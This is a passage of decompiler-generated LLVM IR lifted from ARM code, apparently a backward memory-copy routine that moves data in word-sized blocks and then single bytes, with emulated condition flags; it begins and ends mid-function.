  store i1 %v7_f01c, i1* %cpsr_z.global-to-local, align 1
  %v2_f020 = xor i1 %v6_f01c, %v5_f01c
  br i1 %v2_f020, label %dec_label_pc_f03c, label %dec_label_pc_f024

dec_label_pc_f024:                                ; preds = %dec_label_pc_f018, %dec_label_pc_efd8, %dec_label_pc_f024
  %v1_f030 = phi i32 [ %v4_f030, %dec_label_pc_f024 ], [ %v12_f00c, %dec_label_pc_f018 ], [ %v0_f00c76, %dec_label_pc_efd8 ]
  %v0_f024 = load i32, i32* %lr.global-to-local, align 4
  %v3_f024 = udiv i32 %v0_f024, 16777216
  store i32 %v3_f024, i32* %ip.global-to-local, align 4
  %v0_f028 = load i32, i32* %r1.global-to-local, align 4
  %v1_f028 = inttoptr i32 %v0_f028 to i32*
  %v2_f028 = load i32, i32* %v1_f028, align 4
  store i32 %v2_f028, i32* %lr.global-to-local, align 4
  %v4_f028 = add i32 %v0_f028, 4
  store i32 %v4_f028, i32* %r1.global-to-local, align 4
  %v4_f02c = mul i32 %v2_f028, 256
  %v5_f02c = or i32 %v4_f02c, %v3_f024
  store i32 %v5_f02c, i32* @ip, align 4
  %v2_f030 = inttoptr i32 %v1_f030 to i32*
  store i32 %v5_f02c, i32* %v2_f030, align 4
  %v3_f030 = load i32, i32* %r0.global-to-local, align 4
  %v4_f030 = add i32 %v3_f030, 4
  store i32 %v4_f030, i32* %r0.global-to-local, align 4
  %v0_f034 = load i32, i32* %r2.global-to-local, align 4
  %v1_f034 = add i32 %v0_f034, -4
  store i32 %v1_f034, i32* %r2.global-to-local, align 4
  %v3_f034 = sub i32 3, %v0_f034
  %v4_f034 = and i32 %v3_f034, %v0_f034
  %v5_f034 = icmp slt i32 %v4_f034, 0
  %v6_f034 = icmp slt i32 %v1_f034, 0
  %v2_f038 = xor i1 %v6_f034, %v5_f034
  br i1 %v2_f038, label %dec_label_pc_f03c.loopexit, label %dec_label_pc_f024

dec_label_pc_f03c.loopexit:                       ; preds = %dec_label_pc_f024
  %v7_f034 = icmp eq i32 %v0_f034, 4
  store i1 %v5_f034, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_f034, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_f034, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f03c

dec_label_pc_f03c:                                ; preds = %dec_label_pc_f03c.loopexit, %dec_label_pc_f018
  %v0_ee8c61 = phi i32 [ %v1_f034, %dec_label_pc_f03c.loopexit ], [ %v1_f01c, %dec_label_pc_f018 ]
  %v0_f03c = load i32, i32* %r1.global-to-local, align 4
  %v1_f03c = add i32 %v0_f03c, -1
  store i32 %v1_f03c, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_f044:                                ; preds = %entry
  %v1_f044 = load i32, i32* @r2, align 4
  %v2_f044 = add i32 %v1_f044, %v0_edf0
  store i32 %v2_f044, i32* %r1.global-to-local, align 4
  %v2_f048 = add i32 %v1_f044, %v1_edf0
  store i32 %v2_f048, i32* %r0.global-to-local, align 4
  %v2_f04c = add i32 %v1_f044, -4
  store i32 %v2_f04c, i32* %r2.global-to-local, align 4
  %v4_f04c = sub i32 3, %v1_f044
  %v5_f04c = and i32 %v4_f04c, %v1_f044
  %v6_f04c = icmp slt i32 %v5_f04c, 0
  store i1 %v6_f04c, i1* %cpsr_v.global-to-local, align 1
  %v7_f04c = icmp slt i32 %v2_f04c, 0
  store i1 %v7_f04c, i1* %cpsr_n.global-to-local, align 1
  %v8_f04c = icmp eq i32 %v1_f044, 4
  store i1 %v8_f04c, i1* %cpsr_z.global-to-local, align 1
  %v5_f050 = icmp slt i32 %v1_f044, 4
  br i1 %v5_f050, label %bb151, label %dec_label_pc_f054

dec_label_pc_f054:                                ; preds = %dec_label_pc_f044
  %v1_f054 = urem i32 %v2_f048, 4
  store i32 %v1_f054, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f054 = icmp eq i32 %v1_f054, 0
  store i1 %v2_f054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f054, label %dec_label_pc_f05c, label %dec_label_pc_f0fc

dec_label_pc_f05c:                                ; preds = %dec_label_pc_f054
  %v1_f05c = urem i32 %v2_f044, 4
  store i32 %v1_f05c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f05c = icmp eq i32 %v1_f05c, 0
  store i1 %v2_f05c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f05c, label %dec_label_pc_f064, label %dec_label_pc_f128

dec_label_pc_f064:                                ; preds = %dec_label_pc_f05c, %dec_label_pc_f120
  %v0_f07c37 = phi i32 [ %v2_f048, %dec_label_pc_f05c ], [ %v0_f17020, %dec_label_pc_f120 ]
  %v0_f07836 = phi i32 [ %v2_f044, %dec_label_pc_f05c ], [ %v0_f120, %dec_label_pc_f120 ]
  %v0_f064 = phi i32 [ %v2_f04c, %dec_label_pc_f05c ], [ %v2_f118, %dec_label_pc_f120 ]
  %v2_f064 = add i32 %v0_f064, -8
  store i32 %v2_f064, i32* %r2.global-to-local, align 4
  %v4_f064 = sub i32 7, %v0_f064
  %v5_f064 = and i32 %v4_f064, %v0_f064
  %v6_f064 = icmp slt i32 %v5_f064, 0
  store i1 %v6_f064, i1* %cpsr_v.global-to-local, align 1
  %v7_f064 = icmp slt i32 %v2_f064, 0
  store i1 %v7_f064, i1* %cpsr_n.global-to-local, align 1
  %v8_f064 = icmp eq i32 %v0_f064, 8
  store i1 %v8_f064, i1* %cpsr_z.global-to-local, align 1
  %v5_f068 = icmp slt i32 %v0_f064, 8
  br i1 %v5_f068, label %dec_label_pc_f0b4, label %dec_label_pc_f06c

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f064
  %v3_f06c = load i32, i32* @r4, align 4
  %v5_f06c = inttoptr i32 %v3_f06c to i8*
  store i8* %v5_f06c, i8** %stack_var_-8, align 4
  %v8_f06c = load i32, i32* @lr, align 4
  %v2_f070 = add i32 %v0_f064, -28
  store i32 %v2_f070, i32* %r2.global-to-local, align 4
  %v4_f070 = sub i32 27, %v0_f064
  %v5_f070 = and i32 %v4_f070, %v2_f064
  %v6_f070 = icmp slt i32 %v5_f070, 0
  store i1 %v6_f070, i1* %cpsr_v.global-to-local, align 1
  %v7_f070 = icmp slt i32 %v2_f070, 0
  store i1 %v7_f070, i1* %cpsr_n.global-to-local, align 1
  %v8_f070 = icmp eq i32 %v2_f064, 20
  store i1 %v8_f070, i1* %cpsr_z.global-to-local, align 1
  %v5_f074 = icmp slt i32 %v2_f064, 20
  br i1 %v5_f074, label %dec_label_pc_f090, label %dec_label_pc_f078

dec_label_pc_f078:                                ; preds = %dec_label_pc_f06c, %dec_label_pc_f078.dec_label_pc_f078_crit_edge
  %v0_f07c = phi i32 [ %v1_f084, %dec_label_pc_f078.dec_label_pc_f078_crit_edge ], [ %v0_f07c37, %dec_label_pc_f06c ]
  %v0_f078 = phi i32 [ %v0_f078.pre, %dec_label_pc_f078.dec_label_pc_f078_crit_edge ], [ %v0_f07836, %dec_label_pc_f06c ]
  %v1_f078 = add i32 %v0_f078, -4
  %v2_f078 = inttoptr i32 %v1_f078 to i32*
  %v3_f078 = load i32, i32* %v2_f078, align 4
  %v4_f078 = add i32 %v0_f078, -8
  %v5_f078 = inttoptr i32 %v4_f078 to i32*
  %v6_f078 = load i32, i32* %v5_f078, align 4
  store i32 %v6_f078, i32* %r4.global-to-local, align 4
  %v7_f078 = add i32 %v0_f078, -12
  %v8_f078 = inttoptr i32 %v7_f078 to i32*
  %v9_f078 = load i32, i32* %v8_f078, align 4
  store i32 %v9_f078, i32* %ip.global-to-local, align 4
  %v10_f078 = add i32 %v0_f078, -16
  %v11_f078 = inttoptr i32 %v10_f078 to i32*
  %v12_f078 = load i32, i32* %v11_f078, align 4
  store i32 %v12_f078, i32* %lr.global-to-local, align 4
  store i32 %v10_f078, i32* %r1.global-to-local, align 4
  %v1_f07c = add i32 %v0_f07c, -16
  %v2_f07c = inttoptr i32 %v1_f07c to i32*
  store i32 %v3_f078, i32* %v2_f07c, align 4
  %v4_f07c = add i32 %v0_f07c, -12
  %v5_f07c = inttoptr i32 %v4_f07c to i32*
  %v6_f07c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_f07c, i32* %v5_f07c, align 4
  %v7_f07c = add i32 %v0_f07c, -8
  %v8_f07c = inttoptr i32 %v7_f07c to i32*
  %v9_f07c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_f07c, i32* %v8_f07c, align 4
  %v10_f07c = add i32 %v0_f07c, -4
  %v11_f07c = inttoptr i32 %v10_f07c to i32*
  %v12_f07c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_f07c, i32* %v11_f07c, align 4
  store i32 %v1_f07c, i32* %r0.global-to-local, align 4
  %v0_f080 = load i32, i32* %r1.global-to-local, align 4
  %v1_f080 = add i32 %v0_f080, -4
  %v2_f080 = inttoptr i32 %v1_f080 to i32*
  %v3_f080 = load i32, i32* %v2_f080, align 4
  store i32 %v3_f080, i32* @r3, align 4
  %v4_f080 = add i32 %v0_f080, -8
  %v5_f080 = inttoptr i32 %v4_f080 to i32*
  %v6_f080 = load i32, i32* %v5_f080, align 4
  store i32 %v6_f080, i32* %r4.global-to-local, align 4
  %v7_f080 = add i32 %v0_f080, -12
  %v8_f080 = inttoptr i32 %v7_f080 to i32*
  %v9_f080 = load i32, i32* %v8_f080, align 4
  store i32 %v9_f080, i32* @ip, align 4
  %v10_f080 = add i32 %v0_f080, -16
  %v11_f080 = inttoptr i32 %v10_f080 to i32*
  %v12_f080 = load i32, i32* %v11_f080, align 4
  store i32 %v12_f080, i32* %lr.global-to-local, align 4
  store i32 %v10_f080, i32* %r1.global-to-local, align 4
  %v1_f084 = add i32 %v0_f07c, -32
  %v2_f084 = inttoptr i32 %v1_f084 to i32*
  store i32 %v3_f080, i32* %v2_f084, align 4
  %v4_f084 = add i32 %v0_f07c, -28
  %v5_f084 = inttoptr i32 %v4_f084 to i32*
  %v6_f084 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_f084, i32* %v5_f084, align 4
  %v7_f084 = add i32 %v0_f07c, -24
  %v8_f084 = inttoptr i32 %v7_f084 to i32*
  %v9_f084 = load i32, i32* @ip, align 4
  store i32 %v9_f084, i32* %v8_f084, align 4
  %v10_f084 = add i32 %v0_f07c, -20
  %v11_f084 = inttoptr i32 %v10_f084 to i32*
  %v12_f084 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_f084, i32* %v11_f084, align 4
  store i32 %v1_f084, i32* %r0.global-to-local, align 4
  %v0_f088 = load i32, i32* %r2.global-to-local, align 4
  %v2_f088 = add i32 %v0_f088, -32
  store i32 %v2_f088, i32* %r2.global-to-local, align 4
  %v6_f08c = icmp slt i32 %v0_f088, 32
  br i1 %v6_f08c, label %dec_label_pc_f090.loopexit, label %dec_label_pc_f078.dec_label_pc_f078_crit_edge

dec_label_pc_f078.dec_label_pc_f078_crit_edge:    ; preds = %dec_label_pc_f078
  %v0_f078.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f078

dec_label_pc_f090.loopexit:                       ; preds = %dec_label_pc_f078
  %v4_f088 = sub i32 31, %v0_f088
  %v5_f088 = and i32 %v4_f088, %v0_f088
  %v6_f088 = icmp slt i32 %v5_f088, 0
  %v7_f088 = icmp slt i32 %v2_f088, 0
  store i1 %v6_f088, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_f088, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f090

dec_label_pc_f090:                                ; preds = %dec_label_pc_f090.loopexit, %dec_label_pc_f06c
  %v6_f098 = phi i32 [ %v1_f084, %dec_label_pc_f090.loopexit ], [ %v0_f07c37, %dec_label_pc_f06c ]
  %v0_f0a0.pr = phi i32 [ %v2_f088, %dec_label_pc_f090.loopexit ], [ %v2_f070, %dec_label_pc_f06c ]
  %v4_f090 = add i32 %v0_f0a0.pr, 16
  %v6_f090 = sub i32 0, %v0_f0a0.pr
  %v7_f090 = and i32 %v4_f090, %v6_f090
  %v8_f090 = icmp slt i32 %v7_f090, 0
  store i1 %v8_f090, i1* %cpsr_v.global-to-local, align 1
  %v9_f090 = icmp slt i32 %v4_f090, 0
  store i1 %v9_f090, i1* %cpsr_n.global-to-local, align 1
  %v10_f090 = icmp eq i32 %v4_f090, 0
  store i1 %v10_f090, i1* %cpsr_z.global-to-local, align 1
  %v5_f094 = icmp slt i32 %v0_f0a0.pr, -16
  br i1 %v5_f094, label %.thread2, label %bb148

bb148:                                            ; preds = %dec_label_pc_f090
  %v6_f094 = load i32, i32* %r1.global-to-local, align 4
  %v7_f094 = add i32 %v6_f094, -4
  %v8_f094 = inttoptr i32 %v7_f094 to i32*
  %v9_f094 = load i32, i32* %v8_f094, align 4
  store i32 %v9_f094, i32* @r3, align 4
  %v10_f094 = add i32 %v6_f094, -8
  %v11_f094 = inttoptr i32 %v10_f094 to i32*
  %v12_f094 = load i32, i32* %v11_f094, align 4
  store i32 %v12_f094, i32* %r4.global-to-local, align 4
  %v13_f094 = add i32 %v6_f094, -12
  %v14_f094 = inttoptr i32 %v13_f094 to i32*
  %v15_f094 = load i32, i32* %v14_f094, align 4
  store i32 %v15_f094, i32* @ip, align 4
  %v16_f094 = add i32 %v6_f094, -16
  %v17_f094 = inttoptr i32 %v16_f094 to i32*
  %v18_f094 = load i32, i32* %v17_f094, align 4
  store i32 %v18_f094, i32* %lr.global-to-local, align 4
  store i32 %v16_f094, i32* %r1.global-to-local, align 4
  %v7_f098 = add i32 %v6_f098, -16
  %v8_f098 = inttoptr i32 %v7_f098 to i32*
  store i32 %v9_f094, i32* %v8_f098, align 4
  %v10_f098 = add i32 %v6_f098, -12
  %v11_f098 = inttoptr i32 %v10_f098 to i32*
  %v12_f098 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_f098, i32* %v11_f098, align 4
  %v13_f098 = add i32 %v6_f098, -8
  %v14_f098 = inttoptr i32 %v13_f098 to i32*
  %v15_f098 = load i32, i32* @ip, align 4
  store i32 %v15_f098, i32* %v14_f098, align 4
  %v16_f098 = add i32 %v6_f098, -4
  %v17_f098 = inttoptr i32 %v16_f098 to i32*
  %v18_f098 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_f098, i32* %v17_f098, align 4
  store i32 %v7_f098, i32* %r0.global-to-local, align 4
  %v6_f09c = load i32, i32* %r2.global-to-local, align 4
  %v7_f09c = add i32 %v6_f09c, -16
  store i32 %v7_f09c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_f090, %bb148
  %v6_f0a8 = phi i32 [ %v7_f098, %bb148 ], [ %v6_f098, %dec_label_pc_f090 ]
  %v0_f0a0 = phi i32 [ %v7_f09c, %bb148 ], [ %v0_f0a0.pr, %dec_label_pc_f090 ]
  %v4_f0a0 = add i32 %v0_f0a0, 20
  store i32 %v4_f0a0, i32* %r2.global-to-local, align 4
  %v6_f0a0 = sub i32 0, %v0_f0a0
  %v7_f0a0 = and i32 %v4_f0a0, %v6_f0a0
  %v8_f0a0 = icmp slt i32 %v7_f0a0, 0
  store i1 %v8_f0a0, i1* %cpsr_v.global-to-local, align 1
  %v9_f0a0 = icmp slt i32 %v4_f0a0, 0
  store i1 %v9_f0a0, i1* %cpsr_n.global-to-local, align 1
  %v10_f0a0 = icmp eq i32 %v4_f0a0, 0
  store i1 %v10_f0a0, i1* %cpsr_z.global-to-local, align 1
  %v5_f0a4 = icmp slt i32 %v0_f0a0, -20
  br i1 %v5_f0a4, label %.thread4, label %bb149

bb149:                                            ; preds = %.thread2
  %v6_f0a4 = load i32, i32* %r1.global-to-local, align 4
  %v7_f0a4 = add i32 %v6_f0a4, -4
  %v8_f0a4 = inttoptr i32 %v7_f0a4 to i32*
  %v9_f0a4 = load i32, i32* %v8_f0a4, align 4
  store i32 %v9_f0a4, i32* @r3, align 4
  %v10_f0a4 = add i32 %v6_f0a4, -8
  %v11_f0a4 = inttoptr i32 %v10_f0a4 to i32*
  %v12_f0a4 = load i32, i32* %v11_f0a4, align 4
  store i32 %v12_f0a4, i32* @ip, align 4
  %v13_f0a4 = add i32 %v6_f0a4, -12
  %v14_f0a4 = inttoptr i32 %v13_f0a4 to i32*
  %v15_f0a4 = load i32, i32* %v14_f0a4, align 4
  store i32 %v15_f0a4, i32* %lr.global-to-local, align 4
  store i32 %v13_f0a4, i32* %r1.global-to-local, align 4
  %v7_f0a8 = add i32 %v6_f0a8, -12
  %v8_f0a8 = inttoptr i32 %v7_f0a8 to i32*
  store i32 %v9_f0a4, i32* %v8_f0a8, align 4
  %v10_f0a8 = add i32 %v6_f0a8, -8
  %v11_f0a8 = inttoptr i32 %v10_f0a8 to i32*
  %v12_f0a8 = load i32, i32* @ip, align 4
  store i32 %v12_f0a8, i32* %v11_f0a8, align 4
  %v13_f0a8 = add i32 %v6_f0a8, -4
  %v14_f0a8 = inttoptr i32 %v13_f0a8 to i32*
  %v15_f0a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_f0a8, i32* %v14_f0a8, align 4
  store i32 %v7_f0a8, i32* %r0.global-to-local, align 4
  %v6_f0ac = load i32, i32* %r2.global-to-local, align 4
  %v7_f0ac = add i32 %v6_f0ac, -12
  store i32 %v7_f0ac, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb149
  %v6_f0cc45 = phi i32 [ %v6_f0a8, %.thread2 ], [ %v7_f0a8, %bb149 ]
  %v0_f0b443 = phi i32 [ %v4_f0a0, %.thread2 ], [ %v7_f0ac, %bb149 ]
  %v2_f0b0 = load i8*, i8** %stack_var_-8, align 4
  %v3_f0b0 = ptrtoint i8* %v2_f0b0 to i32
  store i32 %v3_f0b0, i32* @r4, align 4
  store i32 %v8_f06c, i32* @lr, align 4
  br label %dec_label_pc_f0b4

dec_label_pc_f0b4:                                ; preds = %dec_label_pc_f064, %.thread4
  %v7_f0c4 = phi i32 [ %v0_f07c37, %dec_label_pc_f064 ], [ %v6_f0cc45, %.thread4 ]
  %v0_f0b4 = phi i32 [ %v2_f064, %dec_label_pc_f064 ], [ %v0_f0b443, %.thread4 ]
  %v2_f0b4 = add i32 %v0_f0b4, 8
  store i32 %v2_f0b4, i32* %r2.global-to-local, align 4
  %v4_f0b4 = sub i32 0, %v0_f0b4
  %v5_f0b4 = and i32 %v2_f0b4, %v4_f0b4
  %v6_f0b4 = icmp slt i32 %v5_f0b4, 0
  store i1 %v6_f0b4, i1* %cpsr_v.global-to-local, align 1
  %v7_f0b4 = icmp slt i32 %v2_f0b4, 0
  store i1 %v7_f0b4, i1* %cpsr_n.global-to-local, align 1
  %v8_f0b4 = icmp eq i32 %v2_f0b4, 0
  store i1 %v8_f0b4, i1* %cpsr_z.global-to-local, align 1
  %v5_f0b8 = icmp slt i32 %v0_f0b4, -8
  br i1 %v5_f0b8, label %bb151, label %dec_label_pc_f0bc

dec_label_pc_f0bc:                                ; preds = %dec_label_pc_f0b4
  %v6_f0bc = add i32 %v0_f0b4, 4
  store i32 %v6_f0bc, i32* %r2.global-to-local, align 4
  %v8_f0bc = sub i32 -5, %v0_f0b4
  %v9_f0bc = and i32 %v8_f0bc, %v2_f0b4
  %v10_f0bc = icmp slt i32 %v9_f0bc, 0
  store i1 %v10_f0bc, i1* %cpsr_v.global-to-local, align 1
  %v11_f0bc = icmp slt i32 %v6_f0bc, 0
  store i1 %v11_f0bc, i1* %cpsr_n.global-to-local, align 1
  %v12_f0bc = icmp eq i32 %v2_f0b4, 4
  store i1 %v12_f0bc, i1* %cpsr_z.global-to-local, align 1
  %v5_f0c0 = icmp slt i32 %v2_f0b4, 4
  %v6_f0c0 = load i32, i32* %r1.global-to-local, align 4
  %v7_f0c0 = add i32 %v6_f0c0, -4
  %v8_f0c0 = inttoptr i32 %v7_f0c0 to i32*
  %v9_f0c0 = load i32, i32* %v8_f0c0, align 4
  store i32 %v9_f0c0, i32* @r3, align 4
  br i1 %v5_f0c0, label %.thread8, label %bb150

.thread8:                                         ; preds = %dec_label_pc_f0bc
  store i32 %v7_f0c0, i32* %r1.global-to-local, align 4
  %v8_f0c4 = add i32 %v7_f0c4, -4
  %v9_f0c4 = inttoptr i32 %v8_f0c4 to i32*
  store i32 %v9_f0c0, i32* %v9_f0c4, align 4
  %v10_f0c4 = load i32, i32* %r0.global-to-local, align 4
  %v11_f0c4 = add i32 %v10_f0c4, -4
  store i32 %v11_f0c4, i32* %r0.global-to-local, align 4
  %v0_f0d4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb151

bb150:                                            ; preds = %dec_label_pc_f0bc
  %v10_f0c8 = add i32 %v6_f0c0, -8
  %v11_f0c8 = inttoptr i32 %v10_f0c8 to i32*
  %v12_f0c8 = load i32, i32* %v11_f0c8, align 4
  store i32 %v12_f0c8, i32* @ip, align 4
  store i32 %v10_f0c8, i32* %r1.global-to-local, align 4
  %v7_f0cc = add i32 %v7_f0c4, -8
  %v8_f0cc = inttoptr i32 %v7_f0cc to i32*
  store i32 %v9_f0c0, i32* %v8_f0cc, align 4
  %v10_f0cc = add i32 %v7_f0c4, -4
  %v11_f0cc = inttoptr i32 %v10_f0cc to i32*
  %v12_f0cc = load i32, i32* @ip, align 4
  store i32 %v12_f0cc, i32* %v11_f0cc, align 4
  store i32 %v7_f0cc, i32* %r0.global-to-local, align 4
  %v6_f0d0 = load i32, i32* %r2.global-to-local, align 4
  %v7_f0d0 = add i32 %v6_f0d0, -4
  store i32 %v7_f0d0, i32* %r2.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread8, %dec_label_pc_f0b4, %dec_label_pc_f044, %.thread14, %dec_label_pc_f278, %dec_label_pc_f20c, %dec_label_pc_f1a0, %bb150
  %v2_f0d8 = phi i32 [ %v11_f0c4, %.thread8 ], [ %v7_f0c4, %dec_label_pc_f0b4 ], [ %v2_f048, %dec_label_pc_f044 ], [ %v0_f17020, %.thread14 ], [ %v2_f0e453, %dec_label_pc_f278 ], [ %v2_f0e452, %dec_label_pc_f20c ], [ %v2_f0e451, %dec_label_pc_f1a0 ], [ %v7_f0cc, %bb150 ]
  %v0_f0d4 = phi i32 [ %v0_f0d4.pre, %.thread8 ], [ %v2_f0b4, %dec_label_pc_f0b4 ], [ %v2_f04c, %dec_label_pc_f044 ], [ %v2_f118, %.thread14 ], [ %v0_f0d449, %dec_label_pc_f278 ], [ %v0_f0d448, %dec_label_pc_f20c ], [ %v0_f0d447, %dec_label_pc_f1a0 ], [ %v7_f0d0, %bb150 ]
  %v1_f0d4 = add i32 %v0_f0d4, 4
  store i32 %v1_f0d4, i32* @r2, align 4
  %v3_f0d4 = sub i32 0, %v0_f0d4
  %v4_f0d4 = and i32 %v1_f0d4, %v3_f0d4
  %v5_f0d4 = icmp slt i32 %v4_f0d4, 0
  store i1 %v5_f0d4, i1* %cpsr_v.global-to-local, align 1
  %v6_f0d4 = icmp slt i32 %v1_f0d4, 0
  store i1 %v6_f0d4, i1* %cpsr_n.global-to-local, align 1
  %v7_f0d4 = icmp eq i32 %v1_f0d4, 0
  store i1 %v7_f0d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0d4, label %.thread130, label %bb152

bb152:                                            ; preds = %bb151
  %v1_f0dc = add i32 %v0_f0d4, 2
  %v3_f0dc = sub i32 -3, %v0_f0d4
  %v4_f0dc = and i32 %v3_f0dc, %v1_f0d4
  %v5_f0dc = icmp slt i32 %v4_f0dc, 0
  store i1 %v5_f0dc, i1* %cpsr_v.global-to-local, align 1
  %v6_f0dc = icmp slt i32 %v1_f0dc, 0
  store i1 %v6_f0dc, i1* %cpsr_n.global-to-local, align 1
  %v7_f0dc = icmp eq i32 %v1_f0d4, 2
  store i1 %v7_f0dc, i1* %cpsr_z.global-to-local, align 1
  %v0_f0e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_f0e0 = add i32 %v0_f0e0, -1
  %v2_f0e0 = inttoptr i32 %v1_f0e0 to i8*
  %v3_f0e0 = load i8, i8* %v2_f0e0, align 1
  %v4_f0e0 = zext i8 %v3_f0e0 to i32
  store i32 %v4_f0e0, i32* @r3, align 4
  store i32 %v1_f0e0, i32* %r1.global-to-local, align 4
  %v3_f0e4 = add i32 %v2_f0d8, -1
  %v4_f0e4 = inttoptr i32 %v3_f0e4 to i8*
  store i8 %v3_f0e0, i8* %v4_f0e4, align 1
  %v5_f0e4 = load i32, i32* %r0.global-to-local, align 4
  %v6_f0e4 = add i32 %v5_f0e4, -1
  store i32 %v6_f0e4, i32* %r0.global-to-local, align 4
  %v0_f0e8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_f0e8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_f0e8 = xor i1 %v0_f0e8, %v1_f0e8
  br i1 %v2_f0e8, label %.thread129, label %bb153

bb153:                                            ; preds = %bb152
  %v3_f0e8 = load i32, i32* %r1.global-to-local, align 4
  %v4_f0e8 = add i32 %v3_f0e8, -1
  %v5_f0e8 = inttoptr i32 %v4_f0e8 to i8*
  %v6_f0e8 = load i8, i8* %v5_f0e8, align 1
  %v7_f0e8 = zext i8 %v6_f0e8 to i32
  store i32 %v7_f0e8, i32* @r3, align 4
  store i32 %v4_f0e8, i32* %r1.global-to-local, align 4
  %v6_f0ec = add i32 %v5_f0e4, -2
  %v7_f0ec = inttoptr i32 %v6_f0ec to i8*
  store i8 %v6_f0e8, i8* %v7_f0ec, align 1
  %v8_f0ec = load i32, i32* %r0.global-to-local, align 4
  %v9_f0ec = add i32 %v8_f0ec, -1
  store i32 %v9_f0ec, i32* %r0.global-to-local, align 4
  %v1_f0f0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_f0f0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb152, %bb153
  %v7_f0f4 = phi i32 [ %v9_f0ec, %bb153 ], [ %v6_f0e4, %bb152 ]
  %v2_f0f4 = phi i1 [ %v2_f0f0.pre, %bb153 ], [ %v1_f0e8, %bb152 ]
  %v1_f0f4 = phi i1 [ %v1_f0f0.pre, %bb153 ], [ %v0_f0e8, %bb152 ]
  %v0_f0f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_f0f0 = xor i1 %v2_f0f4, %v1_f0f4
  %v4_f0f0 = or i1 %v0_f0f0, %v3_f0f0
  br i1 %v4_f0f0, label %.thread130, label %bb154

bb154:                                            ; preds = %.thread129
  %v5_f0f0 = load i32, i32* %r1.global-to-local, align 4
  %v6_f0f0 = add i32 %v5_f0f0, -1
  %v7_f0f0 = inttoptr i32 %v6_f0f0 to i8*
  %v8_f0f0 = load i8, i8* %v7_f0f0, align 1
  %v9_f0f0 = zext i8 %v8_f0f0 to i32
  store i32 %v9_f0f0, i32* @r3, align 4
  store i32 %v6_f0f0, i32* %r1.global-to-local, align 4
  %v8_f0f4 = add i32 %v7_f0f4, -1
  %v9_f0f4 = inttoptr i32 %v8_f0f4 to i8*
  store i8 %v8_f0f0, i8* %v9_f0f4, align 1
  %v10_f0f4 = load i32, i32* %r0.global-to-local, align 4
  %v11_f0f4 = add i32 %v10_f0f4, -1
  store i32 %v11_f0f4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_f0fc:                                ; preds = %dec_label_pc_f054
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_f0fc = icmp eq i32 %v1_f054, 1
  store i1 %v8_f0fc, i1* %cpsr_n.global-to-local, align 1
  %v9_f0fc = icmp eq i32 %v1_f054, 2
  store i1 %v9_f0fc, i1* %cpsr_z.global-to-local, align 1
  %v1_f100 = add i32 %v2_f044, -1
  %v2_f100 = inttoptr i32 %v1_f100 to i8*
  %v3_f100 = load i8, i8* %v2_f100, align 1
  %v4_f100 = zext i8 %v3_f100 to i32
  store i32 %v4_f100, i32* @r3, align 4
  store i32 %v1_f100, i32* %r1.global-to-local, align 4
  %v3_f104 = add i32 %v2_f048, -1
  %v4_f104 = inttoptr i32 %v3_f104 to i8*
  store i8 %v3_f100, i8* %v4_f104, align 1
  %v5_f104 = load i32, i32* %r0.global-to-local, align 4
  %v6_f104 = add i32 %v5_f104, -1
  store i32 %v6_f104, i32* %r0.global-to-local, align 4
  br i1 %v8_f0fc, label %.thread14, label %bb155

bb155:                                            ; preds = %dec_label_pc_f0fc
  %v6_f108 = load i32, i32* %r1.global-to-local, align 4
  %v7_f108 = add i32 %v6_f108, -1
  %v8_f108 = inttoptr i32 %v7_f108 to i8*
  %v9_f108 = load i8, i8* %v8_f108, align 1
  %v10_f108 = zext i8 %v9_f108 to i32
  store i32 %v10_f108, i32* @r3, align 4
  store i32 %v7_f108, i32* %r1.global-to-local, align 4
  %v9_f10c = add i32 %v5_f104, -2
  %v10_f10c = inttoptr i32 %v9_f10c to i8*
  store i8 %v9_f108, i8* %v10_f10c, align 1
  %v11_f10c = load i32, i32* %r0.global-to-local, align 4
  %v12_f10c = add i32 %v11_f10c, -1
  store i32 %v12_f10c, i32* %r0.global-to-local, align 4
  br i1 %v9_f0fc, label %.thread14, label %bb156

bb156:                                            ; preds = %bb155
  %v8_f110 = load i32, i32* %r1.global-to-local, align 4
  %v9_f110 = add i32 %v8_f110, -1
  %v10_f110 = inttoptr i32 %v9_f110 to i8*
  %v11_f110 = load i8, i8* %v10_f110, align 1
  %v12_f110 = zext i8 %v11_f110 to i32
  store i32 %v12_f110, i32* @r3, align 4
  store i32 %v9_f110, i32* %r1.global-to-local, align 4
  %v11_f114 = add i32 %v11_f10c, -2
  %v12_f114 = inttoptr i32 %v11_f114 to i8*
